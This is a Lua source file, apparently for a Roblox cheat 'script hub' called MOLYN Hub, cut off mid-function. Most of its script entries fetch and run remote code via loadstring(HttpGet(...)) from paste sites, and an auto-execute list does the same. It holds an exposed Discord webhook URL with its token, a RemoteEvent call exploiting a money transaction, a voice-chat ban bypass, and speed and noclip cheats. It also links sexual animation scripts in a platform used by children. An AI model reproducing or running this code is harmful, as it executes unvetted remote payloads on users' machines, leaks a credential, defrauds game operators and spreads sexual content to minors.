-- MOLYN Hub v8.0 - Optimized Version
-- Premium Script Hub with Fast Loading UI
-- Developed by coco_w12345

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local AUTO_EXECUTE_URLS = {
    "https://pastefy.app/VZBaCX3S/raw",
    "https://pastefy.app/aCdqnrWi/raw",
    "https://pastefy.app/CDn6E6MQ/raw",
    "https://pastefy.app/CCK37HxU/raw",
    "https://pastefy.app/RMcZgNJg/raw",
    "https://pastefy.app/RMcZgNJg/raw",
    "https://pastefy.app/XMRZbpM0/raw"
}

local FEEDBACK_WEBHOOK_URL = "https://discord.com/api/webhooks/1411271512798924830/a3BbC4-WFWDGAlv1mZWLdl--EHZ9-V8NSw2aPVhDSqjQ32cQJspzmtSrnRHL7TbZxRij"

local BLACKLIST = {
    ["ONIRYTC"] = "You are banned from using this script",
    ["zaman544"] = "You are banned from using this script",
    ["me_hahahahahhahaha"] = "banned permanently",
    ["haiderfire14"] = "BANNED PERMANENTLY TRY CONTACT WITH coco_w12345 TO GET UNBAN",
    ["8_yg7"] = "You are banned from using this script",
    ["1_MHMD998"] = "You are banned from using this script",
    ["Haiderfire15"] = "BANNED PERMANENTLY TRY CONTACT WITH coco_w12345 TO GEG UNBAN",
    ["mhamd_m15"] = "You are banned from using this script",
    ["mhamd_m13"] = "You are banned from using this script",
    ["joory7474"] = "You are banned from using this script",
    ["Aziz8311"] = "You are banned from using this script",
    ["GOT_SAIF"] = "You are banned from using this script",
    ["Hamza000599"] = "You are banned from using this script",
    ["xc_me4"] = "You are banned from using this script"
}

local IP_BLACKLIST = {
    ["172.99.189.199"] = "IP banned",
    ["37.238.26.11"] = "IP banned",
    ["185.106.28.39"] = "IP banned",
    ["188.53.54.102"] = "IP banned",
    ["185.106.28.174"] = "IP banned",
    ["41.237.182.156"] = "IP banned",
    ["45.32.178.17"] = "IP banned",
    ["999999"] = "IP banned",
    ["46.60.48.37"] = "IP banned"
}

local FEEDBACK_BLACKLIST = {
    "https://discord.gg/zvnNwE3KWd", "Kitsune", "Raccoon", "Bone blossom", "Candy blossom", "jandel"
}

local WARNING_LIST = "SCAMMERS: zaman544, Fffgftgggf1, moen1234567891, ONIRYTC, 8_yg7\nNOTE: IF ANY SCRIPT HAS A KEY SYSTEM (NOT KEYLESS), REPORT IT ON THE DISCORD SERVER OR VIA FEEDBACK.\nIF YOU MAKE YOUR NICKNAME 'MOLYN_ANYTHING', YOU WILL GET A 'MOLYN FAN' TAG THAT APPEARS TO EVERY USER USING THE SCRIPT."

local FEEDBACK_COOLDOWN = 120
local lastFeedbackTime = 0
local MAX_FEEDBACK_LENGTH = 200

local theme = {
    primary = Color3.fromRGB(255, 50, 50),
    secondary = Color3.fromRGB(20, 20, 20),
    accent = Color3.fromRGB(255, 80, 80),
    background = Color3.fromRGB(10, 10, 10),
    surface = Color3.fromRGB(25, 25, 25),
    text = Color3.fromRGB(255, 255, 255),
    textSecondary = Color3.fromRGB(200, 200, 200),
    success = Color3.fromRGB(50, 255, 50),
    warning = Color3.fromRGB(255, 255, 50),
    error = Color3.fromRGB(255, 50, 50),
    closeButton = Color3.fromRGB(255, 50, 50),
    logoBackground = Color3.fromRGB(0, 0, 0),
    discordBlue = Color3.fromRGB(88, 101, 242),
    supportGreen = Color3.fromRGB(50, 200, 50)
}

local http_request = (syn and syn.request) or (http and http.request) or (http_request) or (request) or (httprequest) or (fluxus and fluxus.request)

-- Updated SCRIPTS_DATABASE with proper game IDs
local SCRIPTS_DATABASE = {
    {
        name = "fling things and people",
        description = "anti grab & fire grab and more",
        code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/NameHubScript/_/refs/heads/main/f"))()]],
        gameIds = {"142823291", "893973440", "891852901", "12957268429", "6961824067"},
        featured = false
    },
    {
        name = "UNDERGROUND WAR OP",
        description = "OP SCRIPT HAVE TELEPORT TO TEAMS AND SWORD REACH AND MORE",
        code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/Random-Silly-stuff/refs/heads/main/UW2-Panel.lua"))()]],
        gameIds = {"9791603388"},
        featured = false
    },
    {
        name = "MM2 & Flee the Facility OP",
        description = "OP Features like aimbot and auto shot",
        code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua"))()]],
        gameIds = {"142823291", "893973440"},
        featured = false
    },
    {
        name = "DEAD RAILS AUTO FARM BONDS",
        description = "FARMING BONDS VERY FAST",
        code = [[Auto_Execute = true
loadstring(game:HttpGet('https://raw.githubusercontent.com/hungquan99/HungHub/main/loader.lua'))()]], 
        gameIds = {"116495829188952"}, 
        featured = false
    },
    {
        name = "backdoor.exe",
        description = "check remotes for any backdoor",
        code = [[loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Backdoor-exe-9413"))()]],
        featured = false
    },
    {
        name = "R15 TO R6",
        description = "CONVERTER FROM R15 TO R6",
        code = [[loadstring(game:HttpGet("https://pastebin.com/raw/gdL3TSZ8"))()]],
        featured = true
    },
    {
        name = "EDWARD MAN EATING TRAIN AUTO KILL",
        description = "AUTO KILL EVERYTHING includes Edward's",
        code = [[loadstring(game:HttpGet("https://rawscripts.net/raw/Now-On-Console!-Edward-the-Man-Eating-Train-Rapid-Fire-and-Targeting-GUI-29687"))()]],
        gameIds = {"10875701453"},
        featured = false
    },
    {
        name = "INFINITE MONEY eight driver",
        description = "get infinite money",
        code = [[
            local money = 9e9
            local A_1 = "Sanctioned"
            local A_2 = -money
            local A_3 = "0"
            local A_4 = {}
            local Event = game:GetService("ReplicatedStorage").RemoteEvent
            Event:FireServer(A_1, A_2, A_3, A_4)
        ]],
        gameIds = {"6711562581"},
        featured = false
    },
    {
        name = "MOLYN Spammer(نسخ)",
        description = "commands spammer script",
        code = [[loadstring(game:HttpGet("https://pastefy.app/cD3wfVSo/raw"))()]],
        gameIds = {"125523414229764"},
        featured = false
    },
    {
        name = "Infinite Yield",
        description = "Advanced admin commands script",
        code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()]],
        featured = true
    },
    { 
        name = "AURA FARMING EMOTE",
        description = "AURA FARMING TREND DANCE",
        code = [[loadstring(game:HttpGet("https://pastefy.app/BuZO1EW9/raw"))()]],
        featured = true
    },
    {
        name = "MOLYN CLONE TOWER",
        description = "Teleport to win and sabotage",
        code = [[loadstring(game:HttpGet("https://pastebin.com/raw/6PC6EfqK"))()]],
        gameIds = {"140293690452727"},
        featured = false
    },
    {
        name = "LAG TEST",
        description = "Delete parts in LAG TEST map",
        code = [[loadstring(game:HttpGet("https://pastebin.com/raw/xrZRud3e"))()]],
        gameIds = {"18808135322"},
        featured = false
    },
    {
        name = "Nameless Admin",
        description = "Powerful admin commands script",
        code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()]],
        featured = false
    },
    {
        name = "Unban VC",
        description = "Join voice chat even if banned",
        code = [[
            local VoiceChatService = game:GetService("VoiceChatService")
            local success, result = pcall(function()
                return VoiceChatService:RequestJoinByUserId(game.Players.LocalPlayer.UserId)
            end)
        ]],
        featured = false
    },
    {
        name = "EMOTES/DANCE FE",
        description = "GUI HAVE A LOT OF EMOTES FREE AND ANIMATIONS",
        code = [[loadstring(game:HttpGet("https://yarhm.mhi.im/scr?channel=afem", false))()]],
        gameIds = {"125523414229764"},
        featured = true
    },
    {
        name = "climb and slide OP",
        description = "GIVES OP PETS",
        code = [[loadstring(game:HttpGet("https://pastefy.app/rHuxOpBc/raw"))()]],
        gameIds = {"134236244017051"},
        featured = false
    }, 
    {
        name = "FAKE LAG (ROBLOX EGOR)",
        description = "FAKE LAG SCRIPT BY MOLYN",
        code = [[loadstring(game:HttpGet("https://pastebin.com/raw/Ua84is8X"))()]],
        gameIds = {"125523414229764"},
        featured = true
    },
    {
        name = "vfly molyn",
        description = "Fly with car or without",
        code = [[loadstring(game:HttpGet("https://pastebin.com/raw/99e5KqHX"))()]],
        gameIds = {"537413528", "137925884276740", "88728793053496", "189707", "4924922222", "88728793053496", "137925884276740", "537413528", "654732683"},
        featured = false
    },
    {
        name = "virtual keyboard",
        description = "you can press keys like pc or laptop",
        code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/uuuuuuu/refs/heads/main/VirtualKeyboard.lua"))()]],
        featured = false
    },
    {
        name = "build a boat for treasure infinity slots",
        description = "gives you 100 slots to save your builds",
        code = [[loadstring(game:HttpGet("https://pastefy.app/Eg152MzN/raw"))()]],
        gameIds = {"537413528"},
        featured = false
    },
    {
        name = "MOLYN cmdbar(نسخ شات)",
        description = "spam commands in chat",
        code = [[loadstring(game:HttpGet("https://pastebin.com/raw/Uwu54JfE"))()]],
        gameIds = {"125523414229764"},
        featured = false
    },
    {
        name = "J3RK 0FF 19+⚠️",
        description = "Jerk off",
        code = [[loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()]],
        gameIds = {"125523414229764"},
        featured = false
    },
    {

        name = "JERK OFF R15/R6 REVAMP",
        description = "Jerk off REVAMP BY MOLYN",
        code = [[loadstring(game:HttpGet("https://pastefy.app/oewDd7VX/raw"))()]],
        gameIds = {"125523414229764"},
        featured = false 
    },
    {
        name = "kayak racing",
        description = "AUTO TRAIN AUTO WINS AUTO EGG AND MORE",
        code = [[loadstring(game:HttpGet("https://rawscripts.net/raw/Kayak-Racing-DEMON-HUNTER-AUR,        A-UPDATE-KAYAK-RACING-OP-SCRIPT-KEYLESS-48757"))()]],
        gameIds = {"97777561575736"},
        featured = false
    },
    {
        name = " BABFT MOLYN AUTOFARM",
        description = "FARMS GOLD AND GOLD BLOCK",
        code = [[loadstring(game:HttpGet("https://pastefy.app/eMROCLxC/raw"))()]],
        gameIds = {"537413528"},
        featured = false 
    },
    {
        name = "MOLYN UNIVERSAL",
        description = "universal features like fly.noclip.etc",
        code = [[loadstring(game:HttpGet('https://pastebin.com/raw/wkUVCNj3'))()]],
        featured = false
    },
    {
        name = "Greenville OP",
        description = "(LOAD KEYBOARD SCRIPT AND CLICK G TO HIDE GUI) Car modification like speed and turbo",
        code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/Lugtastic/hubs/main/EcuX-V2.lua"))()]],
        gameIds = {"891852901", "893973440"},
        featured = false
    },
    {
        name = "Grow a garden OP KEYLESS",
        description = "AUTO EVERYTHING KEYLESS",
        code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/shvl00/shvled/refs/heads/main/l04d3r.bf"))()]],
        gameIds = {"126884695634066"},
        featured = false
    },
    {
        name = "99 NIGHTS IN THE FOREST KEYLESS (NEW)",
        description = "kill aura and kill all and speed player",
        code = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()]],
        gameIds = {"79546208627805"},
        featured = false
    },
    {
        name = "AUTO EVERYTHIN Blox Fruits",
        description = "AUTO EVERYTHING",
        code = [[loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Vxeze-Hub-38632"))()]],
        gameIds = {"2753915549"},
        featured = false
    }
}

-- Improved notification system with animations
local function CreateNotification(text, color, duration)
    local gui = Instance.new("ScreenGui")
    gui.Name = "MolynNotification_"..tostring(math.random(1, 10000))
    gui.Parent = CoreGui
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.DisplayOrder = 1000

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 350, 0, 80)
    frame.Position = UDim2.new(0.5, -175, 0, -90)
    frame.BackgroundColor3 = theme.background
    frame.BorderSizePixel = 0
    frame.ZIndex = 100
    frame.Parent = gui
    
    local shadow = Instance.new("Frame")
    shadow.Size = UDim2.new(1, 10, 1, 10)
    shadow.Position = UDim2.new(0, -5, 0, -5)
    shadow.BackgroundColor3 = Color3.new(0, 0, 0)
    shadow.BackgroundTransparency = 0.8
    shadow.BorderSizePixel = 0
    shadow.ZIndex = frame.ZIndex - 1
    shadow.Parent = frame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 15)
    corner.Parent = frame
    
    local icon = Instance.new("TextLabel")
    icon.Text = "🔔"
    icon.Size = UDim2.new(0, 30, 0, 30)
    icon.Position = UDim2.new(0, 15, 0.5, -15)
    icon.BackgroundTransparency = 1
    icon.TextColor3 = color or theme.primary
    icon.Font = Enum.Font.GothamBold
    icon.TextSize = 20
    icon.ZIndex = 101
    icon.Parent = frame
    
    local label = Instance.new("TextLabel")
    label.Text = text
    label.Size = UDim2.new(1, -80, 1, -20)
    label.Position = UDim2.new(0, 50, 0, 10)
    label.BackgroundTransparency = 1
    label.TextColor3 = color or theme.text
    label.Font = Enum.Font.Gotham
    label.TextSize = 16
    label.TextWrapped = true
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.ZIndex = 101
    label.Parent = frame
    
    -- Slide in animation
    local slideIn = TweenService:Create(frame, TweenInfo.new(0.6, Enum.EasingStyle.Back), {
        Position = UDim2.new(0.5, -175, 0, 20)
    })
    
    -- Slide out animation
    local slideOut = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
        Position = UDim2.new(0.5, -175, 0, -90)
    })
    
    slideIn:Play()
    
    if duration then
        delay(duration, function()
            slideOut:Play()
            slideOut.Completed:Wait()
            gui:Destroy()
        end)
    end
    
    return gui
end

-- Security check
local function CheckSecurity()
    if BLACKLIST[player.Name] then
        player:Kick(BLACKLIST[player.Name])
        return false
    end
    
    return true
end

-- Anti-spam system
local function ActivateAntiSpam()
    local services = {
        game:GetService("Workspace"),
        game:GetService("ReplicatedStorage"),
        game:GetService("ServerStorage"),
        game:GetService("StarterGui"),
        game:GetService("StarterPack"),
        game:GetService("Lighting"),
        game:GetService("ServerScriptService"),
        game:GetService("ReplicatedFirst")
    }
    
    local deleted = 0
    for _, service in pairs(services) do
        pcall(function()
            for _, item in pairs(service:GetDescendants()) do
                if string.find(string.lower(item.Name), "hd") then
                    pcall(function() 
                        item:Destroy() 
                        deleted += 1 
                    end)
                end
            end
        end)
    end
    
    if deleted > 0 then
        CreateNotification("ANTI SPAM ACTIVATED", theme.primary, 5)
    end
end

-- Webhook sender
local function SendWebhook(url, data)
    if not http_request then 
        return false 
    end
    
    data["username"] = "MOLYN HUB"
    data["avatar_url"] = "https://imgur.com/gallery/spy-bot-vytTqYx#mvMLTNn"
    
    local success, response = pcall(function()
        local response = http_request({
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
        return response
    end)
    
    if not success then 
        return false 
    end
    
    return true
end

-- Account age detection
local function GetAccountAge()
    local success, age = pcall(function()
        return player.AccountAge
    end)
    return success and age or "Unknown"
end

-- Get scripts for current game
local function GetScripts(currentGameId)
    local supportedScripts = {}
    local featuredScripts = {}
    local regularScripts = {}
    
    for _, script in ipairs(SCRIPTS_DATABASE) do
        local isSupported = false
        local isFeatured = script.featured
        
        if script.gameIds then
            for _, id in ipairs(script.gameIds) do
                if tostring(id) == currentGameId then
                    isSupported = true
                    break
                end
            end
        end
        
        if isSupported then
            table.insert(supportedScripts, script)
        elseif isFeatured then
            table.insert(featuredScripts, script)
        else
            table.insert(regularScripts, script)
        end
    end
    
    return supportedScripts, featuredScripts, regularScripts
end

-- ======== BYPASS SYSTEM START ======== --
local Bypass = {
    WS = {Enabled = false, Value = 16},
    JP = {Enabled = false, Value = 50},
    NC = {Enabled = false},
    IJ = {Enabled = false}, -- Infinite Jump
    UUID = HttpService:GenerateGUID(false):sub(1,8)
}

Bypass.WS_ID = "WS_"..Bypass.UUID
Bypass.JP_ID = "JP_"..Bypass.UUID
Bypass.NC_ID = "NC_"..Bypass.UUID

-- الحصول على الـ Humanoid بطريقة آمنة
local function GetHumanoid()
    local char = player.Character
    if not char then return nil end
    return char:FindFirstChildOfClass("Humanoid")
end

-- Infinite Jump function
local function InfiniteJump()
    if Bypass.IJ.Enabled then
        local humanoid = GetHumanoid()
        if humanoid then
            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end
end

-- تطبيق سرعة المشي
local function ApplyWalkSpeed()
    if not Bypass.WS.Enabled then return end
    
    local humanoid = GetHumanoid()
    if humanoid then
        humanoid:SetAttribute(Bypass.WS_ID, Bypass.WS.Value)
        if humanoid:GetAttribute(Bypass.WS_ID) == Bypass.WS.Value then
            humanoid.WalkSpeed = humanoid:GetAttribute(Bypass.WS_ID)
        end
    end
end

-- تطبيق قوة القفز
local function ApplyJumpPower()
    if not Bypass.JP.Enabled then return end
    
    local humanoid = GetHumanoid()
    if humanoid then
        humanoid:SetAttribute(Bypass.JP_ID, Bypass.JP.Value)
        if humanoid:GetAttribute(Bypass.JP_ID) == Bypass.JP.Value then
            humanoid.JumpPower = humanoid:GetAttribute(Bypass.JP_ID)
        end
    end
end

-- تطبيق وضع الطيران (Noclip)
local function ApplyNoclip()
    if not Bypass.NC.Enabled then return end
    
    local char = player.Character
    if char then
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part:SetAttribute(Bypass.NC_ID, false)
                if part:GetAttribute(Bypass.NC_ID) == false then
                    part.CanCollide = false
                end
            end
        end
    end
end

-- Infinite Jump listener
UserInputService.JumpRequest:Connect(function()
    if Bypass.IJ.Enabled then
        InfiniteJump()
    end
end)

-- لووب التحديث الرئيسي
local function BypassLoop()
    while true do
        ApplyWalkSpeed()
        ApplyJumpPower()
        ApplyNoclip()
        task.wait(0.1)
    end
end

-- بدء النظام
coroutine.wrap(BypassLoop)()
-- ======== BYPASS SYSTEM END ======== --

-- Improved feedback UI
local function CreateFeedbackUI(parent, playerInfo)
    local isMobile = UserInputService.TouchEnabled
    
    local feedbackScroll = Instance.new("ScrollingFrame")
    feedbackScroll.Size = UDim2.new(1, 0, 1, 0)
    feedbackScroll.BackgroundTransparency = 1
    feedbackScroll.ScrollBarThickness = 6
    feedbackScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    feedbackScroll.ScrollingDirection = Enum.ScrollingDirection.Y
    feedbackScroll.VerticalScrollBarInset = Enum.ScrollBarInset.Always
    feedbackScroll.Parent = parent
    
    local feedbackFrame = Instance.new("Frame")
    feedbackFrame.Size = UDim2.new(1, -20, 0, isMobile and 600 or 650) -- Increased height for new button
    feedbackFrame.Position = UDim2.new(0, 10, 0, 0)
    feedbackFrame.BackgroundColor3 = theme.surface
    feedbackFrame.Parent = feedbackScroll
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = feedbackFrame

    local warningLabel = Instance.new("TextLabel")
    warningLabel.Text = WARNING_LIST
    warningLabel.Size = UDim2.new(1, -20, 0, isMobile and 80 or 70) -- Increased height for more text
    warningLabel.Position = UDim2.new(0, 10, 0, 10)
    warningLabel.BackgroundColor3 = theme.warning -- Yellow background
    warningLabel.TextColor3 = Color3.new(0, 0, 0) -- Black text
    warningLabel.Font = Enum.Font.GothamBold
    warningLabel.TextSize = isMobile and 10 or 12
    warningLabel.TextWrapped = true
    warningLabel.Parent = feedbackFrame
    
    local warningCorner = Instance.new("UICorner")
    warningCorner.CornerRadius = UDim.new(0, 6)
    warningCorner.Parent = warningLabel
    
    local discordButton = Instance.new("TextButton")
    discordButton.Text = "JOIN SERVER DISCORD"
    discordButton.Size = UDim2.new(1, -20, 0, isMobile and 35 or 40)
    discordButton.Position = UDim2.new(0, 10, 0, isMobile and 100 or 90)
    discordButton.BackgroundColor3 = theme.discordBlue
    discordButton.TextColor3 = theme.text
    discordButton.Font = Enum.Font.GothamBold
    discordButton.TextSize = isMobile and 12 or 16
    discordButton.Parent = feedbackFrame
    
    local discordCorner = Instance.new("UICorner")
    discordCorner.CornerRadius = UDim.new(0, 6)
    discordCorner.Parent = discordButton
    
    discordButton.MouseButton1Click:Connect(function()
        if setclipboard then
            setclipboard("https://discord.gg/zvnNwE3KWd")
            CreateNotification("Discord link copied!", theme.success, 3)
        end
    end)
    
    local title = Instance.new("TextLabel")
    title.Text = "Send Feedback"
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Position = UDim2.new(0, 10, 0, isMobile and 150 or 140)
    title.BackgroundTransparency = 1
    title.TextColor3 = theme.primary
    title.Font = Enum.Font.GothamBold
    title.TextSize = isMobile and 14 or 18
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = feedbackFrame
    
    local textBox = Instance.new("TextBox")
    textBox.PlaceholderText = "Your feedback (max "..MAX_FEEDBACK_LENGTH.." characters)"
    textBox.Size = UDim2.new(1, -20, 0, isMobile and 100 or 80)
    textBox.Position = UDim2.new(0, 10, 0, isMobile and 185 or 175)
    textBox.BackgroundColor3 = theme.background
    textBox.TextColor3 = theme.text
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = isMobile and 12 or 14
    textBox.TextWrapped = true
    textBox.ClearTextOnFocus = false
    textBox.Text = ""
    textBox.Parent = feedbackFrame
    
    local textCorner = Instance.new("UICorner")
    textCorner.CornerRadius = UDim.new(0, 6)
    textCorner.Parent = textBox
    
    local charCount = Instance.new("TextLabel")
    charCount.Text = "0/"..MAX_FEEDBACK_LENGTH
    charCount.Size = UDim2.new(1, -20, 0, 20)
    charCount.Position = UDim2.new(0, 10, 0, isMobile and 290 or 260)
    charCount.BackgroundTransparency = 1
    charCount.TextColor3 = theme.textSecondary
    charCount.Font = Enum.Font.Gotham
    charCount.TextSize = 12
    charCount.TextXAlignment = Enum.TextXAlignment.Right
    charCount.Parent = feedbackFrame
    
    local sendButton = Instance.new("TextButton")
    sendButton.Text = "SEND"
    sendButton.Size = UDim2.new(0, isMobile and 100 or 120, 0, isMobile and 30 or 35)
    sendButton.Position = UDim2.new(0.5, isMobile and -50 or -60, 0, isMobile and 320 or 290)
    sendButton.BackgroundColor3 = theme.primary
    sendButton.TextColor3 = theme.text
    sendButton.Font = Enum.Font.GothamBold
    sendButton.TextSize = isMobile and 14 or 16
    sendButton.Parent = feedbackFrame
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = sendButton
    
    local settingsLabel = Instance.new("TextLabel")
    settingsLabel.Text = "Player Settings"
    settingsLabel.Size = UDim2.new(1, -20, 0, 30)
    settingsLabel.Position = UDim2.new(0, 10, 0, isMobile and 360 or 330)
    settingsLabel.BackgroundTransparency = 1
    settingsLabel.TextColor3 = theme.primary
    settingsLabel.Font = Enum.Font.GothamBold
    settingsLabel.TextSize = isMobile and 14 or 16
    settingsLabel.TextXAlignment = Enum.TextXAlignment.Left
    settingsLabel.Parent = feedbackFrame
    
    local speedLabel = Instance.new("TextLabel")
    speedLabel.Text = "Speed:"
    speedLabel.Size = UDim2.new(0.3, -5, 0, 25)
    speedLabel.Position = UDim2.new(0, 10, 0, isMobile and 395 or 365)
    speedLabel.BackgroundTransparency = 1
    speedLabel.TextColor3 = theme.text
    speedLabel.Font = Enum.Font.Gotham
    speedLabel.TextSize = isMobile and 12 or 14
    speedLabel.TextXAlignment = Enum.TextXAlignment.Left
    speedLabel.Parent = feedbackFrame
    
    local speedBox = Instance.new("TextBox")
    speedBox.PlaceholderText = "16"
    speedBox.Size = UDim2.new(0.7, -15, 0, isMobile and 25 or 30)
    speedBox.Position = UDim2.new(0.3, 5, 0, isMobile and 395 or 365)
    speedBox.BackgroundColor3 = theme.background
    speedBox.TextColor3 = theme.text
    speedBox.Font = Enum.Font.Gotham
    speedBox.TextSize = isMobile and 12 or 14
    speedBox.Text = tostring(Bypass.WS.Value)
    speedBox.Parent = feedbackFrame
    
    local speedCorner = Instance.new("UICorner")
    speedCorner.CornerRadius = UDim.new(0, 6)
    speedCorner.Parent = speedBox
    
    -- Only allow numbers in speed box
    speedBox:GetPropertyChangedSignal("Text"):Connect(function()
        local text = speedBox.Text
        local newText = string.gsub(text, "%D+", "")
        if text ~= newText then
            speedBox.Text = newText
        end
    end)
    
    local jumpLabel = Instance.new("TextLabel")
    jumpLabel.Text = "Jump Power:"
    jumpLabel.Size = UDim2.new(0.3, -5, 0, 25)
    jumpLabel.Position = UDim2.new(0, 10, 0, isMobile and 425 or 400)
    jumpLabel.BackgroundTransparency = 1
    jumpLabel.TextColor3 = theme.text
    jumpLabel.Font = Enum.Font.Gotham
    jumpLabel.TextSize = isMobile and 12 or 14
    jumpLabel.TextXAlignment = Enum.TextXAlignment.Left
    jumpLabel.Parent = feedbackFrame
    
    local jumpBox = Instance.new("TextBox")
    jumpBox.PlaceholderText = "50 (not working)"
    jumpBox.Size = UDim2.new(0.7, -15, 0, isMobile and 25 or 30)
    jumpBox.Position = UDim2.new(0.3, 5, 0, isMobile and 425 or 400)
    jumpBox.BackgroundColor3 = theme.background
    jumpBox.TextColor3 = theme.text
    jumpBox.Font = Enum.Font.Gotham
    jumpBox.TextSize = isMobile and 12 or 14
    jumpBox.Text = tostring(Bypass.JP.Value)
    jumpBox.Parent = feedbackFrame
    
    -- Only allow numbers in jump box
    jumpBox:GetPropertyChangedSignal("Text"):Connect(function()
        local text = jumpBox.Text
        local newText = string.gsub(text, "%D+", "")
        if text ~= newText then
            jumpBox.Text = newText
        end
    end)
    
    local jumpCorner = Instance.new("UICorner")
    jumpCorner.CornerRadius = UDim.new(0, 6)
    jumpCorner.Parent = jumpBox
    
    local noclipLabel = Instance.new("TextLabel")
    noclipLabel.Text = "Noclip:"
    noclipLabel.Size = UDim2.new(0.3, -5, 0, 25)
    noclipLabel.Position = UDim2.new(0, 10, 0, isMobile and 455 or 435)
    noclipLabel.BackgroundTransparency = 1
    noclipLabel.TextColor3 = theme.text
    noclipLabel.Font = Enum.Font.Gotham
    noclipLabel.TextSize = isMobile and 12 or 14
    noclipLabel.TextXAlignment = Enum.TextXAlignment.Left
    noclipLabel.Parent = feedbackFrame
    
    local noclipBtn = Instance.new("TextButton")
    noclipBtn.Text = Bypass.NC.Enabled and "ON" or "OFF"
    noclipBtn.Size = UDim2.new(0.7, -15, 0, isMobile and 25 or 30)
    noclipBtn.Position = UDim2.new(0.3, 5, 0, isMobile and 455 or 435)
    noclipBtn.BackgroundColor3 = Bypass.NC.Enabled and theme.success or theme.error
    noclipBtn.TextColor3 = theme.text
    noclipBtn.Font = Enum.Font.GothamBold
    noclipBtn.TextSize = isMobile and 12 or 14
    noclipBtn.Parent = feedbackFrame
    
    local noclipCorner = Instance.new("UICorner")
    noclipCorner.CornerRadius = UDim.new(0, 6)
    noclipCorner.Parent = noclipBtn
    
    -- Infinite Jump button
    local infiniteJumpLabel = Instance.new("TextLabel")
    infiniteJumpLabel.Text = "Infinite Jump:"
    infiniteJumpLabel.Size = UDim2.new(0.3, -5, 0, 25)
    infiniteJumpLabel.Position = UDim2.new(0, 10, 0, isMobile and 485 or 470)
    infiniteJumpLabel.BackgroundTransparency = 1
    infiniteJumpLabel.TextColor3 = theme.text
    infiniteJumpLabel.Font = Enum.Font.Gotham
    infiniteJumpLabel.TextSize = isMobile and 12 or 14
    infiniteJumpLabel.TextXAlignment = Enum.TextXAlignment.Left
    infiniteJumpLabel.Parent = feedbackFrame
    
    local infiniteJumpBtn = Instance.new("TextButton")
    infiniteJumpBtn.Text = Bypass.IJ.Enabled and "ON" or "OFF"
    infiniteJumpBtn.Size = UDim2.new(0.7, -15, 0, isMobile and 25 or 30)
    infiniteJumpBtn.Position = UDim2.new(0.3, 5, 0, isMobile and 485 or 470)
    infiniteJumpBtn.BackgroundColor3 = Bypass.IJ.Enabled and theme.success or theme.error
    infiniteJumpBtn.TextColor3 = theme.text
    infiniteJumpBtn.Font = Enum.Font.GothamBold
    infiniteJumpBtn.TextSize = isMobile and 12 or 14
    infiniteJumpBtn.Parent = feedbackFrame
    
    local infiniteJumpCorner = Instance.new("UICorner")
    infiniteJumpCorner.CornerRadius = UDim.new(0, 6)
    infiniteJumpCorner.Parent = infiniteJumpBtn
    
    local credits = Instance.new("TextLabel")
    credits.Text = "MOLYN CREATOR :      coco_w12345"
    credits.Size = UDim2.new(1, -20, 0, 40)
    credits.Position = UDim2.new(0, 10, 1, isMobile and -40 or -50)
    credits.BackgroundTransparency = 1
    credits.TextColor3 = theme.textSecondary
    credits.Font = Enum.Font.Gotham
    credits.TextSize = 12
    credits.TextXAlignment = Enum.TextXAlignment.Left
    credits.Parent = feedbackFrame
    
    -- إعداد صناديق السرعة والقفز
    speedBox.FocusLost:Connect(function()
        local speed = tonumber(speedBox.Text)
        if speed then
            Bypass.WS.Value = speed
            Bypass.WS.Enabled = true
            ApplyWalkSpeed()
            CreateNotification("Speed set to "..speed, theme.success, 3)
        else
            speedBox.Text = tostring(Bypass.WS.Value)
        end
    end)
    
    jumpBox.FocusLost:Connect(function()
        local jump = tonumber(jumpBox.Text)
        if jump then
            Bypass.JP.Value = jump
            Bypass.JP.Enabled = true
            ApplyJumpPower()
            CreateNotification("Jump power set to "..jump, theme.success, 3)
        else
            jumpBox.Text = tostring(Bypass.JP.Value)
        end
    end)

    -- زر الطيران
    local function toggleNoclip()
        Bypass.NC.Enabled = not Bypass.NC.Enabled
        if Bypass.NC.Enabled then
            noclipBtn.Text = "ON"
            noclipBtn.BackgroundColor3 = theme.success
            CreateNotification("Noclip enabled", theme.success, 3)
        else
            noclipBtn.Text = "OFF"
            noclipBtn.BackgroundColor3 = theme.error
            CreateNotification("Noclip disabled", theme.warning, 3)
        end
    end
    
    -- زر القفز اللانهائي
